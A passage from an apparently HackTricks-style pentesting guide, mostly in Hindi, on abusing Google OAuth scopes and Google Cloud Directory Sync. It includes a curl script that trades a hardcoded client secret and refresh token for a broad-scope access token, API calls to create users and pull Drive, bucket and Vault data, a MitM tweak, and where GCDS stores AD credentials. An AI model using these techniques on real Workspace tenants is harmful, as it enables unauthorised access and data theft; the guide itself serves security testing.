https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome
```
</details>

‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§∏‡§¨‡§∏‡•á ‡§¶‡§ø‡§≤‡§ö‡§∏‡•ç‡§™ ‡§∏‡§Ç‡§≠‡§µ‡§§‡§É ‡§π‡•à:
```c
// OAuth2 scope for access to all Google APIs.
const char kAnyApiOAuth2Scope[] = "https://www.googleapis.com/auth/any-api";
```
‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø, ‡§Æ‡•à‡§Ç‡§®‡•á ‡§á‡§∏ ‡§¶‡§æ‡§Ø‡§∞‡•á ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó gmail ‡§§‡§ï ‡§™‡§π‡•Å‡§Å‡§ö‡§®‡•á ‡§Ø‡§æ ‡§∏‡§Æ‡•Ç‡§π‡•ã‡§Ç ‡§ï‡•Ä ‡§∏‡•Ç‡§ö‡•Ä ‡§¨‡§®‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§ï‡•ã‡§∂‡§ø‡§∂ ‡§ï‡•Ä ‡§î‡§∞ ‡§Ø‡§π ‡§ï‡§æ‡§Æ ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§ø‡§Ø‡§æ, ‡§á‡§∏‡§≤‡§ø‡§è ‡§Æ‡•Å‡§ù‡•á ‡§®‡§π‡•Ä‡§Ç ‡§™‡§§‡§æ ‡§ï‡§ø ‡§Ø‡§π ‡§Ö‡§≠‡•Ä ‡§ï‡§ø‡§§‡§®‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó‡•Ä ‡§π‡•à‡•§

**‡§∏‡§≠‡•Ä ‡§â‡§® ‡§¶‡§æ‡§Ø‡§∞‡•ã‡§Ç ‡§ï‡•á ‡§∏‡§æ‡§• ‡§è‡§ï ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ü‡•ã‡§ï‡§® ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç**:

<details>

<summary>‡§∏‡§≠‡•Ä ‡§¶‡§æ‡§Ø‡§∞‡•ã‡§Ç ‡§ï‡•á ‡§∏‡§æ‡§• refresh_token ‡§∏‡•á ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ü‡•ã‡§ï‡§® ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è Bash ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü</summary>
```bash
export scope=$(echo "https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome" | tr '\n' ' ')

curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token
```
</details>

‡§ï‡•Å‡§õ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§â‡§® ‡§∏‡•ç‡§ï‡•ã‡§™‡•ç‡§∏ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡•á ‡§π‡•Å‡§è:

<details>

<summary>https://www.googleapis.com/auth/userinfo.email &#x26; https://www.googleapis.com/auth/userinfo.profile</summary>
```bash
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/oauth2/v2/userinfo"

{
"id": "100203736939176354570",
"email": "hacktricks@example.com",
"verified_email": true,
"name": "John Smith",
"given_name": "John",
"family_name": "Smith",
"picture": "https://lh3.googleusercontent.com/a/ACg8ocKLvue[REDACTED]wcnzhyKH_p96Gww=s96-c",
"locale": "en",
"hd": "example.com"
}
```
</details>

<details>

<summary>https://www.googleapis.com/auth/admin.directory.user</summary>
```bash
# List users
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/admin/directory/v1/users?customer=<workspace_id>&maxResults=100&orderBy=email"

# Create user
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"primaryEmail": "newuser@hdomain.com",
"name": {
"givenName": "New",
"familyName": "User"
},
"password": "UserPassword123",
"changePasswordAtNextLogin": true
}' \
"https://www.googleapis.com/admin/directory/v1/users"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/drive</summary>
```bash
# List files
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?pageSize=10&fields=files(id,name,modifiedTime)&orderBy=name"
{
"files": [
{
"id": "1Z8m5ALSiHtewoQg1LB8uS9gAIeNOPBrq",
"name": "Veeam new vendor form 1 2024.docx",
"modifiedTime": "2024-08-30T09:25:35.219Z"
}
]
}

# Download file
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/<file-id>?alt=media" \
-o "DownloadedFileName.ext"

# Upload file
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/file.ext \
"https://www.googleapis.com/upload/drive/v3/files?uploadType=media"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/devstorage.read_write</summary>
```bash
# List buckets from a project
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b?project=<project-id>"

# List objects in a bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/<bucket-name>/o?maxResults=10&fields=items(id,name,size,updated)&orderBy=name"

# Upload file to bucket
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/yourfile.ext \
"https://www.googleapis.com/upload/storage/v1/b/<BUCKET_NAME>/o?uploadType=media&name=<OBJECT_NAME>"

# Download file from bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/BUCKET_NAME/o/OBJECT_NAME?alt=media" \
-o "DownloadedFileName.ext"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/spreadsheets</summary>  
https://www.googleapis.com/auth/spreadsheets  
</details>
```bash
# List spreadsheets
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?q=mimeType='application/vnd.google-apps.spreadsheet'&fields=files(id,name,modifiedTime)&pageSize=100"

# Download as pdf
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/106VJxeyIsVTkixutwJM1IiJZ0ZQRMiA5mhfe8C5CxMc/export?mimeType=application/pdf" \
-o "Spreadsheet.pdf"

# Create spreadsheet
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"properties": {
"title": "New Spreadsheet"
}
}' \
"https://sheets.googleapis.com/v4/spreadsheets"

# Read data from a spreadsheet
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A1:C10"

# Update data in spreadsheet
curl -X PUT \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"range": "Sheet1!A2:C2",
"majorDimension": "ROWS",
"values": [
["Alice Johnson", "28", "alice.johnson@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A2:C2?valueInputOption=USER_ENTERED"

# Append data
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"values": [
["Bob Williams", "35", "bob.williams@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/SPREADSHEET_ID/values/Sheet1!A:C:append?valueInputOption=USER_ENTERED"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/ediscovery (Google Vault)</summary>

**Google Workspace Vault** Google Workspace ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§ê‡§°-‡§ë‡§® ‡§π‡•à ‡§ú‡•ã ‡§Ü‡§™‡§ï‡•á ‡§∏‡§Ç‡§ó‡§†‡§® ‡§ï‡•á ‡§°‡•á‡§ü‡§æ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§°‡•á‡§ü‡§æ ‡§∏‡§Ç‡§∞‡§ï‡•ç‡§∑‡§£, ‡§ñ‡•ã‡§ú ‡§î‡§∞ ‡§®‡§ø‡§∞‡•ç‡§Ø‡§æ‡§§ ‡§ï‡•á ‡§â‡§™‡§ï‡§∞‡§£ ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ú‡•ã Google Workspace ‡§∏‡•á‡§µ‡§æ‡§ì‡§Ç ‡§ú‡•à‡§∏‡•á Gmail, Drive, Chat, ‡§î‡§∞ ‡§Ö‡§ß‡§ø‡§ï ‡§Æ‡•á‡§Ç ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§π‡•à‡•§

* Google Workspace Vault ‡§Æ‡•á‡§Ç ‡§è‡§ï **Matter** ‡§è‡§ï **container** ‡§π‡•à ‡§ú‡•ã ‡§è‡§ï ‡§µ‡§ø‡§∂‡§ø‡§∑‡•ç‡§ü ‡§Æ‡§æ‡§Æ‡§≤‡•á, ‡§ú‡§æ‡§Ç‡§ö, ‡§Ø‡§æ ‡§ï‡§æ‡§®‡•Ç‡§®‡•Ä ‡§Æ‡§æ‡§Æ‡§≤‡•á ‡§∏‡•á ‡§∏‡§Ç‡§¨‡§Ç‡§ß‡§ø‡§§ ‡§∏‡§≠‡•Ä ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§ï‡•ã ‡§µ‡•ç‡§Ø‡§µ‡§∏‡•ç‡§•‡§ø‡§§ ‡§î‡§∞ ‡§∏‡§Æ‡•Ç‡§π‡§ø‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§ ‡§Ø‡§π ‡§â‡§∏ ‡§µ‡§ø‡§∂‡•á‡§∑ ‡§Æ‡•Å‡§¶‡•ç‡§¶‡•á ‡§∏‡•á ‡§∏‡§Ç‡§¨‡§Ç‡§ß‡§ø‡§§ **Holds**, **Searches**, ‡§î‡§∞ **Exports** ‡§™‡•ç‡§∞‡§¨‡§Ç‡§ß‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡•á‡§Ç‡§¶‡•ç‡§∞‡•Ä‡§Ø ‡§π‡§¨ ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§
* Google Workspace Vault ‡§Æ‡•á‡§Ç ‡§è‡§ï **Hold** ‡§è‡§ï **preservation action** ‡§π‡•à ‡§ú‡•ã ‡§µ‡§ø‡§∂‡§ø‡§∑‡•ç‡§ü ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§Ø‡§æ ‡§∏‡§Æ‡•Ç‡§π‡•ã‡§Ç ‡§™‡§∞ ‡§≤‡§æ‡§ó‡•Ç ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§â‡§®‡§ï‡•á ‡§°‡•á‡§ü‡§æ ‡§ï‡•ã Google Workspace ‡§∏‡•á‡§µ‡§æ‡§ì‡§Ç ‡§ï‡•á ‡§≠‡•Ä‡§§‡§∞ **‡§π‡§ü‡§æ‡§®‡•á ‡§Ø‡§æ ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡§®‡•á** ‡§∏‡•á **‡§∞‡•ã‡§ï‡§®‡•á** ‡§ï‡•á ‡§≤‡§ø‡§è‡•§ Holds ‡§Ø‡§π ‡§∏‡•Å‡§®‡§ø‡§∂‡•ç‡§ö‡§ø‡§§ ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø ‡§™‡•ç‡§∞‡§æ‡§∏‡§Ç‡§ó‡§ø‡§ï ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§ï‡§æ‡§®‡•Ç‡§®‡•Ä ‡§Æ‡§æ‡§Æ‡§≤‡•á ‡§Ø‡§æ ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡•Ä ‡§Ö‡§µ‡§ß‡§ø ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§î‡§∞ ‡§Ö‡§™‡§∞‡§ø‡§µ‡§∞‡•ç‡§§‡§ø‡§§ ‡§¨‡§®‡•Ä ‡§∞‡§π‡•á‡•§
```bash
# List matters
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters?pageSize=10"

# Create matter
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"name": "Legal Case 2024",
"description": "Matter for the upcoming legal case involving XYZ Corp.",
"state": "OPEN"
}' \
"https://vault.googleapis.com/v1/matters"

# Get specific matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>"

# List holds in a matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>/holds?pageSize=10"
```
More [API endpoints in the docs](https://developers.google.com/vault/reference/rest).

</details>

## GCDS - Google Cloud Directory Sync

‡§Ø‡§π ‡§è‡§ï ‡§â‡§™‡§ï‡§∞‡§£ ‡§π‡•à ‡§ú‡§ø‡§∏‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó **‡§Ü‡§™‡§ï‡•á ‡§∏‡§ï‡•ç‡§∞‡§ø‡§Ø ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂‡§ø‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§î‡§∞ ‡§∏‡§Æ‡•Ç‡§π‡•ã‡§Ç ‡§ï‡•ã ‡§Ü‡§™‡§ï‡•á Workspace ‡§ï‡•á ‡§∏‡§æ‡§• ‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à** (‡§î‡§∞ ‡§á‡§∏ ‡§≤‡•á‡§ñ‡§® ‡§ï‡•á ‡§∏‡§Æ‡§Ø ‡§á‡§∏‡§ï‡•á ‡§µ‡§ø‡§™‡§∞‡•Ä‡§§ ‡§®‡§π‡•Ä‡§Ç)‡•§

‡§Ø‡§π ‡§¶‡§ø‡§≤‡§ö‡§∏‡•ç‡§™ ‡§π‡•à ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§Ø‡§π ‡§è‡§ï ‡§â‡§™‡§ï‡§∞‡§£ ‡§π‡•à ‡§ú‡§ø‡§∏‡•á **Workspace ‡§∏‡•Å‡§™‡§∞‡§Ø‡•Ç‡§ú‡§∞ ‡§î‡§∞ ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞ ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ AD ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•á ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏** ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•ã‡§ó‡•Ä‡•§ ‡§á‡§∏‡§≤‡§ø‡§è, ‡§Ø‡§π ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à ‡§ï‡§ø ‡§á‡§∏‡•á ‡§è‡§ï ‡§°‡•ã‡§Æ‡•á‡§® ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§™‡§æ‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á ‡§ú‡•ã ‡§∏‡§Æ‡§Ø-‡§∏‡§Æ‡§Ø ‡§™‡§∞ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§ø‡§§ ‡§ï‡§∞ ‡§∞‡§π‡§æ ‡§π‡•ã‡•§

{% hint style="info" %}
To perform a **MitM** to the **`config-manager.exe`** binary just add the following line in the `config.manager.vmoptions` file: **`-Dcom.sun.net.ssl.checkRevocation=false`**
{% endhint %}

{% hint style="success" %}
Note that [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) is capable to detect **GCDS**, get information about the configuration and **even the passwords and encrypted credentials**.
{% endhint %}

‡§Ø‡§π ‡§≠‡•Ä ‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø GCDS AD ‡§∏‡•á Workspace ‡§Æ‡•á‡§Ç ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§ø‡§§ ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞‡•á‡§ó‡§æ‡•§ ‡§Ø‡§¶‡§ø ‡§ï‡•Å‡§õ ‡§π‡•ã‡§ó‡§æ ‡§§‡•ã ‡§Ø‡§π Workspace ‡§Æ‡•á‡§Ç ‡§®‡§è ‡§¨‡§®‡§æ‡§è ‡§ó‡§è ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è ‡§¨‡§∏ ‡§Ø‡§æ‡§¶‡•É‡§ö‡•ç‡§õ‡§ø‡§ï ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§ï‡§∞‡•á‡§ó‡§æ ‡§ú‡•à‡§∏‡§æ ‡§ï‡§ø ‡§Ü‡§™ ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§õ‡§µ‡§ø ‡§Æ‡•á‡§Ç ‡§¶‡•á‡§ñ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-5780773316536156543-x.jpg" alt="" width="515"><figcaption></figcaption></figure>

### GCDS - Disk Tokens & AD Credentials

‡§¨‡§æ‡§á‡§®‡§∞‡•Ä `config-manager.exe` (‡§Æ‡•Å‡§ñ‡•ç‡§Ø GCDS ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä GUI ‡§ï‡•á ‡§∏‡§æ‡§•) ‡§∏‡§ï‡•ç‡§∞‡§ø‡§Ø ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂‡§ø‡§ï‡§æ ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏, ‡§∞‡§ø‡§´‡•ç‡§∞‡•á‡§∂ ‡§ü‡•ã‡§ï‡§® ‡§î‡§∞ ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ï‡•ã ‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§∞‡•Ç‡§™ ‡§∏‡•á **xml ‡§´‡§º‡§æ‡§á‡§≤** ‡§Æ‡•á‡§Ç **`C:\Program Files\Google Cloud Directory Sync`** ‡§´‡§º‡•ã‡§≤‡•ç‡§°‡§∞ ‡§Æ‡•á‡§Ç **`Untitled-1.xml`** ‡§®‡§æ‡§Æ‡§ï ‡§´‡§º‡§æ‡§á‡§≤ ‡§Æ‡•á‡§Ç ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§ï‡§∞‡•á‡§ó‡§æ‡•§ ‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø, ‡§á‡§∏‡•á ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•á `Documents` ‡§Æ‡•á‡§Ç ‡§Ø‡§æ **‡§ï‡§ø‡§∏‡•Ä ‡§Ö‡§®‡•ç‡§Ø ‡§´‡§º‡•ã‡§≤‡•ç‡§°‡§∞** ‡§Æ‡•á‡§Ç ‡§≠‡•Ä ‡§∏‡§π‡•á‡§ú‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡•ç‡§∞‡•Ä **`HKCU\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\ui`** ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§ï‡•Ä ‡§ï‡•Å‡§Ç‡§ú‡•Ä **`open.recent`** ‡§π‡§æ‡§≤ ‡§π‡•Ä ‡§Æ‡•á‡§Ç ‡§ñ‡•ã‡§≤‡•á ‡§ó‡§è ‡§∏‡§≠‡•Ä ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞‡•á‡§∂‡§® ‡§´‡§º‡§æ‡§á‡§≤‡•ã‡§Ç (xmls) ‡§ï‡•á ‡§™‡§•‡•ã‡§Ç ‡§ï‡•ã ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à‡•§ ‡§á‡§∏‡§≤‡§ø‡§è ‡§á‡§∏‡•á **‡§ñ‡•ã‡§ú‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ú‡§æ‡§Ç‡§ö‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à**‡•§

‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§∏‡§¨‡§∏‡•á ‡§¶‡§ø‡§≤‡§ö‡§∏‡•ç‡§™ ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§π‡•ã‡§ó‡•Ä:
```xml
[...]
<loginMethod>OAUTH2</loginMethod>
<oAuth2RefreshToken>rKvvNQxi74JZGI74u68aC6o+3Nu1ZgVUYdD1GyoWyiHHxtWx+lbx3Nk8dU27fts5lCJKH/Gp1q8S6kEM2AvjQZN16MkGTU+L2Yd0kZsIJWeO0K0RdVaK2D9Saqchk347kDgGsQulJnuxU+Puo46+aA==</oAuth2RefreshToken>
<oAuth2Scopes>
<scope>https://www.google.com/m8/feeds/</scope>
<scope>https://www.googleapis.com/auth/admin.directory.group</scope>
<scope>https://www.googleapis.com/auth/admin.directory.orgunit</scope>
<scope>https://www.googleapis.com/auth/admin.directory.resource.calendar</scope>
<scope>https://www.googleapis.com/auth/admin.directory.user</scope>
<scope>https://www.googleapis.com/auth/admin.directory.userschema</scope>
